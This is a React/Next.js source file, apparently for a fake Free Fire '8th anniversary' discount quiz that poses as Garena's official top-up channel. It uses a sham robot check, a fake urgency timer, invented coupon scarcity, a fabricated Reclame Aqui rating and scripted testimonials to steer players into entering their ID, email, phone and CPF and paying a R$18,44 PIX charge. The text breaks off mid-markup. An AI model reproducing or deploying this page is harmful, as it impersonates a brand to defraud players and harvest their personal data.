"use client";

import { useState, useEffect, useCallback } from "react";
import {
  Clock,
  CircleCheckBig,
  Heart,
  Star,
  User,
  Shield,
  Loader2,
  CheckCircle,
} from "lucide-react";
import { QRCodeSVG } from "qrcode.react";
import { questions, testimonials, offers, midpoints } from "@/data/questions";
import type { QuizOption } from "@/data/questions";

type PageState =
  | "security"
  | "landing"
  | "quiz"
  | "midpoint"
  | "coupon-reserved"
  | "wrong-answer"
  | "verification"
  | "result"
  | "recarga"
  | "logado"
  | "pagamento"
  | "pix"
  | "sucesso";

export default function Home() {
  const [page, setPage] = useState<PageState>("security");
  const [discount, setDiscount] = useState(0);
  const [currentQuestion, setCurrentQuestion] = useState(0);
  const [timer, setTimer] = useState(15 * 60);
  const [timerActive, setTimerActive] = useState(false);
  const [isVerified, setIsVerified] = useState(false);
  const [playerId, setPlayerId] = useState("");
  const [email, setEmail] = useState("");
  const [phone, setPhone] = useState("");
  const [cpf, setCpf] = useState("");
  const [selectedOffers, setSelectedOffers] = useState<number[]>([]);
  const [verificationPercent, setVerificationPercent] = useState(0);
  const [visibleTestimonials, setVisibleTestimonials] = useState(0);
  const [bannerIndex, setBannerIndex] = useState(0);
  const [formErrors, setFormErrors] = useState<Record<string, string>>({});
  const [pixData, setPixData] = useState<{
    qr_code: string;
    qr_code_base64: string;
    transaction_id: string;
    reference: string;
    expires_at: string;
    amount: number;
  } | null>(null);
  const [pixLoading, setPixLoading] = useState(false);
  const [pixError, setPixError] = useState("");
  const [pixTimer, setPixTimer] = useState(10 * 60);
  const [copied, setCopied] = useState(false);

  // ---- Helpers: validation & formatting ----
  function validateCPF(cpf: string): boolean {
    const digits = cpf.replace(/\D/g, "");
    if (digits.length !== 11) return false;
    if (/^(\d)\1{10}$/.test(digits)) return false;
    let sum = 0;
    for (let i = 0; i < 9; i++) sum += parseInt(digits[i]) * (10 - i);
    let remainder = (sum * 10) % 11;
    if (remainder === 10) remainder = 0;
    if (remainder !== parseInt(digits[9])) return false;
    sum = 0;
    for (let i = 0; i < 10; i++) sum += parseInt(digits[i]) * (11 - i);
    remainder = (sum * 10) % 11;
    if (remainder === 10) remainder = 0;
    if (remainder !== parseInt(digits[10])) return false;
    return true;
  }

  function validateEmail(email: string): boolean {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
  }

  function formatCPF(value: string) {
    const digits = value.replace(/\D/g, "").slice(0, 11);
    if (digits.length <= 3) return digits;
    if (digits.length <= 6) return `${digits.slice(0, 3)}.${digits.slice(3)}`;
    if (digits.length <= 9) return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6)}`;
    return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6, 9)}-${digits.slice(9)}`;
  }

  function formatPhone(value: string) {
    const digits = value.replace(/\D/g, "").slice(0, 11);
    if (digits.length <= 2) return digits.length ? `(${digits}` : "";
    if (digits.length <= 7) return `(${digits.slice(0, 2)}) ${digits.slice(2)}`;
    return `(${digits.slice(0, 2)}) ${digits.slice(2, 7)}-${digits.slice(7)}`;
  }

  // Timer countdown
  useEffect(() => {
    if (!timerActive) return;
    const interval = setInterval(() => {
      setTimer((t) => (t > 0 ? t - 1 : 0));
    }, 1000);
    return () => clearInterval(interval);
  }, [timerActive]);

  // Banner carousel
  useEffect(() => {
    if (page !== "recarga" && page !== "logado") return;
    const interval = setInterval(() => {
      setBannerIndex((i) => (i + 1) % 3);
    }, 3000);
    return () => clearInterval(interval);
  }, [page]);

  // PIX expiry countdown
  useEffect(() => {
    if (page !== "pix" || !pixData) return;
    setPixTimer(10 * 60);
    const interval = setInterval(() => {
      setPixTimer((t) => (t > 0 ? t - 1 : 0));
    }, 1000);
    return () => clearInterval(interval);
  }, [page, pixData]);

  // Poll payment status
  useEffect(() => {
    if (!pixData?.transaction_id || page !== "pix") return;
    const interval = setInterval(async () => {
      try {
        const res = await fetch(`/api/check-payment?id=${pixData.transaction_id}`);
        const data = await res.json();
        if (data.status === "approved") {
          clearInterval(interval);
          setPage("sucesso");
        }
      } catch {
        // silently retry
      }
    }, 3000);
    return () => clearInterval(interval);
  }, [pixData, page]);

  const createPix = useCallback(async () => {
    setPixLoading(true);
    setPixError("");
    try {
      const amountCents = 1844; // R$ 18,44
      const res = await fetch("/api/create-pix", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          amount: amountCents,
          description: "Recarga Free Fire - Diamantes",
          customer: {
            name: playerId,
            email: email,
            document: cpf.replace(/\D/g, ""),
            phone: phone.replace(/\D/g, ""),
          },
        }),
      });
      const data = await res.json();
      if (!res.ok) {
        setPixError(data.error || "Erro ao gerar PIX. Tente novamente.");
        return;
      }
      setPixData(data);
      setPage("pix");
    } catch {
      setPixError("Erro de conexão. Tente novamente.");
    } finally {
      setPixLoading(false);
    }
  }, [playerId, email, cpf, phone]);

  const handlePaymentSubmit = () => {
    const errors: Record<string, string> = {};
    if (!validateEmail(email)) errors.email = "E-mail inválido.";
    if (phone.replace(/\D/g, "").length < 10) errors.phone = "Telefone inválido.";
    if (!validateCPF(cpf)) errors.cpf = "CPF inválido.";
    setFormErrors(errors);
    if (Object.keys(errors).length > 0) return;
    createPix();
  };

  const formatTime = (seconds: number) => {
    const m = Math.floor(seconds / 60);
    const s = seconds % 60;
    return `00:${m.toString().padStart(2, "0")}:${s.toString().padStart(2, "0")}`;
  };

  const handleSecurityClick = () => {
    if (isVerified) return;
    setIsVerified(true);
    setTimeout(() => {
      setPage("landing");
      setTimerActive(true);
    }, 800);
  };

  const handleStartQuiz = () => {
    setPage("quiz");
    setCurrentQuestion(0);
    setDiscount(0);
    setTimer(15 * 60);
  };

  const handleAnswer = (option: QuizOption) => {
    const q = questions[currentQuestion];
    const hasCorrect = q.options.some((o) => o.correct);

    if (hasCorrect && !option.correct) {
      setPage("wrong-answer");
      return;
    }

    setDiscount((d) => d + option.discount);

    if (currentQuestion === 0) {
      setPage("midpoint");
    } else if (currentQuestion === 3) {
      setPage("coupon-reserved");
    } else if (currentQuestion === 6) {
      setPage("verification");
    } else {
      setCurrentQuestion((c) => c + 1);
    }
  };

  const handleRetry = () => {
    setPage("quiz");
  };

  const handleMidpointContinue = () => {
    setCurrentQuestion(1);
    setPage("quiz");
  };

  const handleCouponContinue = () => {
    setCurrentQuestion(4);
    setPage("quiz");
  };

  // Verification auto-progress
  useEffect(() => {
    if (page !== "verification") return;
    setVerificationPercent(0);
    setVisibleTestimonials(0);
    let step = 0;
    const interval = setInterval(() => {
      step++;
      setVerificationPercent(Math.min(step, 100));

      if (step === 5) setVisibleTestimonials(1);
      if (step === 17) setVisibleTestimonials(2);
      if (step === 32) setVisibleTestimonials(3);
      if (step === 45) setVisibleTestimonials(4);
      if (step === 55) setVisibleTestimonials(5);
      if (step === 65) setVisibleTestimonials(6);
      if (step === 78) setVisibleTestimonials(7);
      if (step === 90) setVisibleTestimonials(8);

      if (step >= 100) {
        clearInterval(interval);
        setTimeout(() => setPage("result"), 500);
      }
    }, 60);
    return () => clearInterval(interval);
  }, [page]);

  const handleLogin = () => {
    if (playerId.trim()) {
      setPage("logado");
    }
  };

  const TimerBar = () => (
    <div className="fixed top-0 left-0 right-0 z-50 bg-white/95 py-2.5 px-4 flex items-center justify-center gap-2 border-b border-[#e0e0e0] drop-shadow-sm">
      <span className="text-[#1a1a1a] font-bold text-lg font-mono tabular-nums">
        {formatTime(timer)}
      </span>
      <Clock className="w-5 h-5 text-[#1a1a1a]/70" />
      <span className="text-[#1a1a1a]/80 text-xs font-medium">
        Oferta por tempo limitado!
      </span>
    </div>
  );

  // ============ SECURITY PAGE ============
  if (page === "security") {
    return (
      <div className="flex flex-col items-center justify-center px-5 py-12 max-w-md mx-auto gap-8 min-h-[60vh]">
        <img
          src="/images/freefire-logo-large.png"
          alt="Free Fire"
          className="w-64 h-auto select-none"
        />
        <h2 className="text-lg font-extrabold text-[#ee2b2b] italic text-center">
          Verificação de Segurança
        </h2>
        <button
          onClick={handleSecurityClick}
          className={`w-full h-14 rounded-xl border-2 font-bold text-sm flex items-center justify-center gap-2 transition-all duration-300 select-none ${
            isVerified
              ? "border-green-500 bg-green-500/10 text-green-500"
              : "border-[#e0e0e0] bg-[rgba(240,240,240,0.5)] text-[#1a1a1a] hover:border-[#ee2b2b]/40 hover:bg-[#ee2b2b]/5 active:scale-[0.98]"
          }`}
        >
          {isVerified ? (
            <>
              <CheckCircle className="w-5 h-5" /> Verificado!
            </>
          ) : (
            "🛡 Clique para verificar que você não é um robô"
          )}
        </button>
        <p className="text-xs text-[#666] text-center">
          Complete a verificação para continuar
        </p>
      </div>
    );
  }

  // ============ LANDING PAGE ============
  if (page === "landing") {
    return (
      <div className="min-h-screen bg-white flex flex-col pt-12">
        <TimerBar />
        <div className="flex-1">
          <div className="flex flex-col items-center px-5 py-6 max-w-md mx-auto mb-28 mt-6">
            <img
              src="/images/freefire-logo-large.png"
              alt="Free Fire"
              className="w-[320px] h-auto select-none"
            />
            <img
              src="/images/banner-8anos-original.png"
              alt="8º Aniversário Free Fire"
              className="w-[280px] h-auto my-4"
            />
            <h1 className="text-xl font-bold text-center mb-4">
              <span className="mr-1">🎉</span>
              <span className="text-[#ee2b2b]">
                Comemore junto com a gente em grande estilo!
              </span>
            </h1>
            <p className="text-center text-[#1a1a1a]/80 mb-4 leading-relaxed text-base">
              O Free Fire está celebrando seu{" "}
              <strong className="text-[#1a1a1a]">8º aniversário</strong> com o
              lançamento de um novo mapa chamado{" "}
              <strong className="text-[#1a1a1a]">Solara,</strong> que marca o
              primeiro cenário inédito em três anos.
            </p>
            <p className="text-center text-[#1a1a1a]/80 mb-4 leading-relaxed text-sm">
              E para você celebrar essa{" "}
              <strong className="text-[#1a1a1a]">semana especial</strong>{" "}
              conosco, a Garena está liberando um presente exclusivo para nossa
              comunidade!
            </p>
            <p className="text-center text-[#1a1a1a]/80 mb-4 leading-relaxed text-sm">
              <span className="mr-1">🎁</span>Mostre seu conhecimento no jogo e
              desbloqueie um{" "}
              <strong className="text-[#1a1a1a]">
                CUPOM ESPECIAL 8º ANIVERSÁRIO de 90% de desconto
              </strong>{" "}
              para comprar diamantes!
            </p>
            <p className="text-center text-[#1a1a1a]/80 mb-4 leading-relaxed text-sm">
              O desafio é limitado apenas uma vez nesse acesso, caso feche o
              site,{" "}
              <strong className="text-[#1a1a1a]">perderá sua chance!</strong>
            </p>
            <p className="text-center text-[#1a1a1a]/80 mb-4 leading-relaxed text-xs">
              ⚡ Vai perder essa oportunidade? Participe agora e celebre junto
              com a gente!!⚡
            </p>
            <p className="text-xs text-[#666] mt-4">Feito com o XQuiz</p>
          </div>
        </div>
        <div className="fixed bottom-0 left-0 z-10 w-full px-5 pb-6 pt-12 bg-gradient-to-t from-white from-65%">
          <button
            onClick={handleStartQuiz}
            className="w-full max-w-md mx-auto block bg-gradient-to-r from-red-600 to-red-500 text-white font-bold text-base py-5 rounded-xl shadow-[0_4px_20px_rgba(238,43,43,0.4)] btn-pulse"
          >
            INICIAR DESAFIO
          </button>
        </div>
      </div>
    );
  }

  // ============ QUIZ PAGE ============
  if (page === "quiz") {
    const q = questions[currentQuestion];
    const totalQuestions = questions.length;
    const progress = (currentQuestion / totalQuestions) * 100;

    return (
      <div className="min-h-screen bg-white flex flex-col pt-12">
        <TimerBar />
        <div className="flex flex-col items-center px-5 py-6 max-w-md mx-auto gap-4">
          <img
            src="/images/freefire-logo-large.png"
            alt="Free Fire"
            className="w-[320px] h-auto select-none"
          />

          {/* Progress Bar */}
          <div className="w-full h-3 bg-[#1a1a1a] rounded-full overflow-hidden border-2 border-[#ee2b2b]/60">
            <div
              className="h-full rounded-r-full transition-all duration-500 ease-out"
              style={{
                width: `${progress}%`,
                background:
                  "linear-gradient(to right, rgb(37,42,46), rgb(255,185,0))",
              }}
            />
          </div>

          {/* Discount Card */}
          <div className="border-2 border-[#ee2b2b] rounded-xl p-4 flex items-center justify-between bg-white w-full">
            <div className="flex items-center gap-3">
              <CircleCheckBig className="w-6 h-6 text-[#ee2b2b]" />
              <div>
                <p className="font-bold text-sm text-[#ee2b2b] uppercase">
                  Desconto
                </p>
                <p className="text-sm text-[#1a1a1a] font-semibold">
                  Acumulado
                </p>
              </div>
            </div>
            <div className="bg-[#1a1a1a] text-[#ee2b2b] font-extrabold text-2xl px-5 py-2.5 rounded-lg min-w-[72px] text-center">
              {discount}%
            </div>
          </div>

          {/* Question Label */}
          {q.label && (
            <h3 className="text-xl font-extrabold text-[#ee2b2b] mb-2 text-center">
              {q.label}
            </h3>
          )}

          {/* Question */}
          <h2 className="text-lg font-bold text-center mb-6 leading-snug text-[#1a1a1a]">
            {q.emoji && <span className="mr-1">{q.emoji}</span>}
            {q.question}
          </h2>

          {/* Options */}
          {q.type === "text-list" && (
            <div className="flex flex-col gap-3 w-full">
              {q.options.map((opt, i) => (
                <button
                  key={i}
                  onClick={() => handleAnswer(opt)}
                  className="w-full text-left p-4 rounded-2xl border transition-all duration-200 flex items-center gap-3 border-[#e0e0e0] bg-[rgba(240,240,240,0.5)] hover:border-[#ee2b2b]/40 hover:shadow-sm"
                >
                  <span className="text-3xl">{opt.emoji}</span>
                  <span className="text-[15px] font-semibold text-[#1a1a1a]/90">
                    {opt.text}
                  </span>
                </button>
              ))}
            </div>
          )}

          {q.type === "image-grid" && (
            <div className="grid grid-cols-2 gap-3 w-full">
              {q.options.map((opt, i) => (
                <button
                  key={i}
                  onClick={() => handleAnswer(opt)}
                  className="p-4 rounded-2xl border transition-all duration-200 text-center flex flex-col items-center gap-2 border-[#e0e0e0] bg-[rgba(240,240,240,0.5)] hover:border-[#ee2b2b]/40 hover:shadow-sm"
                >
                  <img
                    src={`/images/${opt.image}.png`}
                    alt={opt.text}
                    className="w-36 h-28 object-contain"
                  />
                  <span className="text-sm font-bold text-[#1a1a1a]">
                    {opt.text}
                  </span>
                </button>
              ))}
            </div>
          )}

          {q.type === "text-grid" && (
            <div className="grid grid-cols-2 gap-3 w-full">
              {q.options.map((opt, i) => (
                <button
                  key={i}
                  onClick={() => handleAnswer(opt)}
                  className="p-5 rounded-2xl border transition-all duration-200 text-center border-[#e0e0e0] bg-[rgba(240,240,240,0.5)] hover:border-[#ee2b2b]/40 hover:shadow-sm"
                >
                  <span className="text-base font-bold text-[#1a1a1a]">
                    {opt.text}
                  </span>
                </button>
              ))}
            </div>
          )}

          <p className="text-xs text-[#666] mt-8">Feito com o XQuiz</p>
        </div>
      </div>
    );
  }

  // ============ MIDPOINT PAGE ============
  if (page === "midpoint") {
    const mp = midpoints[0];
    return (
      <div className="min-h-screen bg-white flex flex-col pt-12">
        <TimerBar />
        <div className="flex flex-col items-center px-5 py-6 max-w-md mx-auto gap-4">
          <img
            src="/images/freefire-logo-large.png"
            alt="Free Fire"
            className="w-[320px] h-auto select-none"
          />

          <h2 className="text-2xl font-extrabold text-[#ee2b2b] mb-8 text-center">
            {mp.title}
          </h2>

          {mp.facts.map((fact, i) => (
            <p
              key={i}
              className="text-center text-[#1a1a1a]/80 mb-4 leading-relaxed text-base"
            >
              <span className="mr-1">{fact.emoji}</span>
              <strong>{fact.bold}</strong> {fact.text}
              {i === mp.facts.length - 1 && mp.extra && (
                <strong> {mp.extra}</strong>
              )}
            </p>
          ))}

          <p className="text-sm text-[#666] italic text-center mb-6">
            ⚠ *Responda corretamente as perguntas asseguir para acumular{" "}
            <strong>cada vez mais desconto!</strong>
          </p>

          <button
            onClick={handleMidpointContinue}
            className="w-full bg-gradient-to-r from-red-600 to-red-500 text-white font-extrabold text-base py-5 rounded-2xl shadow-[0_4px_20px_rgba(238,43,43,0.4)] btn-pulse"
          >
            🔥 {mp.cta}
          </button>

          <p className="text-xs text-[#666] mt-8">Feito com o XQuiz</p>
        </div>
      </div>
    );
  }

  // ============ WRONG ANSWER PAGE ============
  if (page === "wrong-answer") {
    return (
      <div className="min-h-screen bg-white flex flex-col pt-12">
        <TimerBar />
        <div className="flex-1 flex flex-col items-center justify-center px-5 py-6 max-w-md mx-auto gap-4 min-h-[60vh]">
          <span className="text-[120px] leading-none font-extrabold text-red-500 select-none">
            ✕
          </span>
          <h2 className="text-2xl font-extrabold text-red-500">
            Vishh... Você Errou.
          </h2>
          <p className="text-base font-semibold text-[#1a1a1a]">
            Você possui mais tentativas
          </p>
          <p className="text-xs text-[#666]">Feito com o XQuiz</p>
        </div>
        <div className="px-5 pb-6 max-w-md mx-auto w-full">
          <button
            onClick={handleRetry}
            className="w-full bg-gradient-to-r from-red-600 to-red-500 text-white font-extrabold text-base py-5 rounded-2xl shadow-[0_4px_20px_rgba(238,43,43,0.4)]"
          >
            Tentar Novamente.
          </button>
        </div>
      </div>
    );
  }

  // ============ COUPON RESERVED PAGE ============
  if (page === "coupon-reserved") {
    const circumference = 2 * Math.PI * 63;
    const offset = circumference * (1 - 0.04);

    return (
      <div className="min-h-screen bg-white flex flex-col pt-12">
        <TimerBar />
        <div className="flex flex-col items-center px-5 py-6 max-w-md mx-auto">
          <img
            src="/images/freefire-logo-large.png"
            alt="Free Fire"
            className="w-[320px] h-auto select-none"
          />

          <h1 className="text-2xl font-extrabold text-[#ef4343] mt-4 mb-2 underline text-center">
            CUPOM RESERVADO
          </h1>

          <p className="text-lg font-semibold text-center mb-4">
            Você ja concluiu{" "}
            <strong className="underline">{discount}%</strong>!
          </p>

          <h2 className="text-xl font-extrabold text-[#1a1a1a] mb-2 text-center">
            Os <span className="text-[#ee2b2b]">Cupons</span> estão acabando.
          </h2>

          <p className="text-sm text-[#1a1a1a]/80 text-center mb-6">
            Seu cupom será reservado{" "}
            <strong>durante 15 minutos</strong>. Responda antes do tempo acabar.
          </p>

          <div className="w-full grid grid-cols-2 gap-3 mb-10">
            <div className="bg-white rounded-2xl p-4 flex flex-col items-center border-2 border-[#ee2b2b]">
              <p className="text-xs font-bold text-[#ee2b2b] uppercase mb-2">
                CUPONS RESTANTES
              </p>
              <svg width="140" height="140" viewBox="0 0 140 140">
                <circle
                  cx="70"
                  cy="70"
                  r="63"
                  stroke="#1a1a1a"
                  strokeWidth="14"
                  fill="transparent"
                />
                <circle
                  cx="70"
                  cy="70"
                  r="63"
                  stroke="hsl(120, 60%, 45%)"
                  strokeWidth="14"
                  fill="transparent"
                  strokeDasharray={circumference}
                  strokeDashoffset={offset}
                  strokeLinecap="round"
                  transform="rotate(-90 70 70)"
                />
                <text
                  x="70"
                  y="78"
                  textAnchor="middle"
                  className="font-extrabold text-2xl"
                  fill="#1a1a1a"
                >
                  4%
                </text>
              </svg>
            </div>

            <div className="bg-white rounded-2xl p-4 flex flex-col items-center border-2 border-[#ee2b2b]">
              <p className="text-xs font-bold text-[#1a1a1a] mb-2">
                23 cupons disponíveis
              </p>
              <img
                src="/images/diamonds-chest.png"
                alt="Diamantes"
                className="w-32 h-auto"
              />
            </div>
          </div>

          <button
            onClick={handleCouponContinue}
            className="w-full bg-gradient-to-r from-red-600 to-red-500 text-white font-extrabold text-base py-5 rounded-2xl shadow-[0_4px_20px_rgba(238,43,43,0.4)] btn-pulse"
          >
            Continuar
          </button>
        </div>
      </div>
    );
  }

  // ============ VERIFICATION PAGE ============
  if (page === "verification") {
    return (
      <div className="min-h-screen bg-white flex flex-col pt-12">
        <TimerBar />
        <div className="flex flex-col items-center px-5 py-6 max-w-md mx-auto gap-6">
          <img
            src="/images/freefire-logo-large.png"
            alt="Free Fire"
            className="w-80 h-auto select-none"
          />

          <h2 className="text-xl font-extrabold text-[#ee2b2b] italic">
            Quase lá...
          </h2>

          <div className="w-full">
            <div
              className="w-full h-6 rounded-full overflow-hidden border-2 border-[#1a1a1a]/20"
              style={{
                background: "hsl(0, 0%, 90%)",
                boxShadow: "inset 0 2px 4px rgba(0,0,0,0.15)",
              }}
            >
              <div
                className="h-full rounded-full transition-all duration-100 flex items-center justify-center text-xs font-extrabold text-white drop-shadow-md"
                style={{
                  width: `${Math.max(verificationPercent, 5)}%`,
                  background:
                    "linear-gradient(to right, hsl(350,80%,40%), hsl(0,85%,55%), hsl(10,90%,60%))",
                  boxShadow: "0 2px 8px hsla(0,85%,55%,0.5)",
                }}
              >
                {verificationPercent}%
              </div>
            </div>
          </div>

          <div className="text-center">
            <p className="font-bold text-[#1a1a1a] mb-1">
              Conferindo respostas...
            </p>
            <p className="text-sm text-[#1a1a1a]/60">
              Verificando e enviando ao servidor. Aguarde ser redirecionado.
            </p>
          </div>

          {/* Reclame Aqui Card */}
          <div className="w-full border border-[#e0e0e0] rounded-2xl p-5 bg-white shadow-sm">
            <div className="flex items-center gap-3 mb-3">
              <img
                src="/images/reclame-aqui-logo.png"
                alt="Reclame Aqui"
                className="w-10 h-10 rounded-full object-contain"
              />
              <div>
                <p className="font-bold text-[#1a1a1a] text-sm">
                  RECLAME AQUI
                </p>
                <p className="text-xs text-[#666]">
                  Melhores empresas no Reclame AQUI
                </p>
              </div>
            </div>
            <p className="text-sm text-[#1a1a1a]/80 text-center mb-3">
              A empresa atingiu a reputação máxima no Reclame AQUI. Sua nota
              média nos últimos 6 meses é{" "}
              <strong>9.0/10.</strong> Reputação
            </p>
            <button className="flex items-center gap-1 text-sm text-[#666] hover:text-[#ee2b2b]">
              <Heart className="w-4 h-4" /> <span>1.200</span>
            </button>
          </div>

          {/* Testimonials */}
          {testimonials.slice(0, visibleTestimonials).map((t, i) => (
            <div
              key={i}
              className="w-full border border-[#e0e0e0] rounded-2xl p-4 bg-white shadow-sm"
            >
              <div className="flex items-center gap-3 mb-2">
                <img
                  src={`/images/${t.avatar}`}
                  alt={t.name}
                  className="w-10 h-10 rounded-full object-cover"
                />
                <div>
                  <p className="font-bold text-[#1a1a1a] text-sm">{t.name}</p>
                  <p className="text-xs text-[#666]">{t.location}</p>
                </div>
              </div>
              <div className="flex gap-0.5 mb-2">
                {Array.from({ length: t.stars }).map((_, j) => (
                  <Star
                    key={j}
                    className="w-4 h-4 fill-yellow-400 text-yellow-400"
                  />
                ))}
              </div>
              <p
                className="text-sm text-[#1a1a1a]/80"
                dangerouslySetInnerHTML={{ __html: t.text }}
              />
            </div>
          ))}
        </div>
      </div>
    );
  }

  // ============ RESULT PAGE ============
  if (page === "result") {
    return (
      <div className="min-h-screen bg-white flex flex-col pt-12">
        <TimerBar />
        <div className="flex flex-col items-center px-5 py-6 max-w-md mx-auto gap-4">
          <div className="w-full h-3 bg-[#1a1a1a] rounded-full overflow-hidden border-2 border-[#ee2b2b]/60">
            <div
              className="h-full rounded-r-full"
              style={{
                width: "100%",
                background:
                  "linear-gradient(to right, rgb(37,42,46), rgb(255,185,0))",
              }}
            />
          </div>

          <h1 className="text-lg font-bold text-[#ee2b2b] text-center leading-snug italic">
            🔥 Parabéns, guerreiro! Você mostrou que entende tudo de Free Fire!
            🔥
          </h1>

          <img
            src="/images/reward-trophy.png"
            alt="Recompensa"
            className="w-40 h-auto"
          />

          <h2 className="text-lg font-bold text-center mb-1">
            🎉 <span className="text-[#ee2b2b]">Cupom aplicado</span>{" "}
            <span>(90% de desconto em diamantes!)</span>
          </h2>

          <p className="text-xs text-[#ee2b2b] text-center italic">
            *clique para resgatar
          </p>

          <p className="text-center text-[#1a1a1a]/80 text-sm leading-relaxed">
            🎁 Como recompensa, aqui está o seu{" "}
            <strong className="text-[#1a1a1a]">CUPOM EXCLUSIVO</strong> para
            comprar diamantes e{" "}
            <strong className="text-[#1a1a1a]">
              garantir os melhores itens do evento de aniversário de 8 anos Free
              Fire!
            </strong>
          </p>

          <button
            onClick={() => setPage("recarga")}
            className="w-full bg-gradient-to-r from-red-600 to-red-500 text-white font-extrabold text-base py-5 rounded-2xl shadow-[0_4px_20px_rgba(238,43,43,0.4)] btn-pulse"
          >
            RESGATAR CUPOM
          </button>
        </div>
      </div>
    );
  }

  // ============ RECARGA PAGE ============
  if (page === "recarga") {
    const banners = [
      "/images/banner-ref-1.jpg",
      "/images/banner-ref-2.png",
      "/images/banner-ref-3.png",
    ];

    return (
      <div className="min-h-screen bg-[#f8f9fa] flex flex-col">
        <header className="bg-white px-4 py-3 flex items-center justify-between shadow-sm">
          <div className="flex items-center gap-2">
            <img
              src="/images/garena-logo-mobile.svg"
              alt="Garena"
              className="h-6"
            />
            <span className="text-[#1a1a1a] font-medium text-sm">
              Canal Oficial de Recarga
            </span>
          </div>
          <div className="w-8 h-8 rounded-full border-2 border-gray-300 flex items-center justify-center">
            <User className="w-4 h-4 text-gray-400" />
          </div>
        </header>

        <div className="bg-[#1a1a1a] w-full py-4 overflow-hidden">
          <div className="flex justify-center items-center gap-3 px-4">
            {banners.map((b, i) => (
              <img
                key={i}
                src={b}
                alt={`Banner ${i + 1}`}
                className={`rounded-xl shadow-2xl transition-all duration-500 ${
                  i === bannerIndex
                    ? "w-[75%] opacity-100"
                    : "w-[15%] opacity-50 scale-90"
                }`}
              />
            ))}
          </div>
          <div className="flex justify-center gap-2 mt-3">
            {[0, 1, 2, 3].map((i) => (
              <div
                key={i}
                className={`w-2 h-2 rounded-full ${
                  i === bannerIndex ? "bg-red-500" : "bg-white/40"
                }`}
              />
            ))}
          </div>
        </div>

        <div className="px-4 py-4 space-y-4">
          <h3 className="font-bold text-[#1a1a1a] text-sm mb-3">
            Seleção de jogos
          </h3>
          <div className="flex gap-4">
            <div className="flex flex-col items-center cursor-pointer">
              <div className="w-16 h-16 rounded-2xl overflow-hidden border-2 border-red-500">
                <img
                  src="/images/ff-icon.png"
                  className="w-full h-full object-cover"
                  alt="Free Fire"
                />
              </div>
              <span className="text-xs font-bold text-red-500 mt-1">
                Free Fire
              </span>
            </div>
            <div className="flex flex-col items-center opacity-50">
              <div className="w-16 h-16 rounded-2xl overflow-hidden border-2 border-transparent">
                <img
                  src="/images/delta-force-icon.png"
                  className="w-full h-full object-cover"
                  alt="Delta Force"
                />
              </div>
              <span className="text-xs text-[#666] mt-1">Delta Force</span>
            </div>
          </div>

          <div className="bg-gradient-to-r from-[#2d1b69] to-[#1a1145] rounded-xl p-4 flex items-center gap-3">
            <img
              src="/images/ff-icon.png"
              alt="Free Fire"
              className="w-14 h-14 rounded-xl shadow-md"
            />
            <div>
              <h3 className="text-white font-bold text-lg">Free Fire</h3>
              <span className="text-white/80 text-xs border border-white/30 rounded-full px-2 py-0.5 flex items-center gap-1 w-fit">
                <Shield className="w-3 h-3" /> Pagamento 100% Seguro
              </span>
            </div>
          </div>

          <div className="border rounded-lg p-4 flex items-center justify-between bg-white">
            <div>
              <h4 className="font-bold text-[#1a1a1a]">Item Grátis</h4>
              <p className="text-sm text-[#666]">
                Resgate aqui seus itens exclusivos grátis
              </p>
              <button className="bg-[#ef4444] text-white font-bold text-sm px-4 py-1.5 rounded-lg mt-2">
                Resgatar
              </button>
            </div>
            <div className="text-right">
              <img
                src="/images/pacote-armas.png"
                alt="Pacote"
                className="w-16 h-16 object-contain"
              />
              <p className="text-xs text-[#666]">Pacote de Arm...</p>
            </div>
          </div>

          <div className="flex items-center gap-2 mb-4">
            <div className="w-6 h-6 rounded-full bg-[#ef4444] text-white flex items-center justify-center text-xs font-bold">
              1
            </div>
            <h3 className="text-lg font-bold text-[#1a1a1a]">Login</h3>
          </div>

          <div className="border rounded-lg p-4 bg-white">
            <label className="text-sm font-medium text-[#1a1a1a] mb-1 block">
              ID do jogador
            </label>
            <div className="flex gap-2">
              <input
                type="text"
                placeholder="Insira o ID de jogador aqui"
                value={playerId}
                onChange={(e) => setPlayerId(e.target.value)}
                className="flex-1 border border-[#d1d5db] rounded-lg px-4 py-2.5 text-[13px] text-[#111] placeholder:text-[#9ca3af] focus:outline-none focus:border-[#ef4444] transition bg-white"
              />
              <button
                onClick={handleLogin}
                disabled={!playerId.trim()}
                className="bg-[#ef4444] text-white font-bold px-6 py-2.5 rounded-lg hover:bg-[#dc2626] transition text-[14px] disabled:opacity-50"
              >
                Login
              </button>
            </div>
            <p className="text-xs text-[#666] mt-2">
              Ou entre com sua conta de jogo
            </p>
          </div>

          <h2 className="font-bold text-center text-lg mt-6">
            Faça login inserindo o seu id para resgatar seu desconto!
          </h2>

          <div className="border-2 border-[#dc3545] rounded-lg bg-[#fff5f5] p-4 mt-4">
            <p className="text-sm text-[#1a1a1a]/80">
              Você ganhou 90% de desconto!
            </p>
            <p className="font-bold text-lg flex items-center gap-1">
              💎 5.200
            </p>
          </div>
        </div>

        <footer className="bg-[#f8f9fa] border-t px-4 py-4 flex flex-col sm:flex-row justify-between items-center text-xs text-[#666] gap-2 mt-auto">
          <span>© Garena Online. Todos os direitos reservados.</span>
          <div className="flex gap-4">
            <a href="#">FAQ</a>
            <a href="#">Termos e Condições</a>
            <a href="#">Política de Privacidade</a>
          </div>
        </footer>
      </div>
    );
  }

  // ============ LOGADO PAGE ============
  if (page === "logado") {
    const banners = [
      "/images/banner-ref-1.jpg",
      "/images/banner-ref-2.png",
      "/images/banner-ref-3.png",
    ];

    return (
      <div className="min-h-screen bg-[#f8f9fa] flex flex-col pb-24">
        <header className="bg-white px-4 py-3 flex items-center justify-between shadow-sm">
          <div className="flex items-center gap-2">
            <img
              src="/images/garena-logo-mobile.svg"
              alt="Garena"
              className="h-6"
            />
            <span className="text-[#1a1a1a] font-medium text-sm">
              Canal Oficial de Recarga
            </span>
          </div>
          <div className="w-8 h-8 rounded-full border-2 border-gray-300 flex items-center justify-center">
            <User className="w-4 h-4 text-gray-400" />
          </div>
        </header>

        <div className="px-4 py-2">
          <button
            onClick={() => setPage("recarga")}
            className="bg-[#1a1a1a] text-white text-sm font-medium px-3 py-1.5 rounded-lg"
          >
            &lt; Voltar
          </button>
        </div>

        <div className="bg-[#1a1a1a] w-full py-4 overflow-hidden">
          <div className="flex justify-center items-center gap-3 px-4">
            {banners.map((b, i) => (
              <img
                key={i}
                src={b}
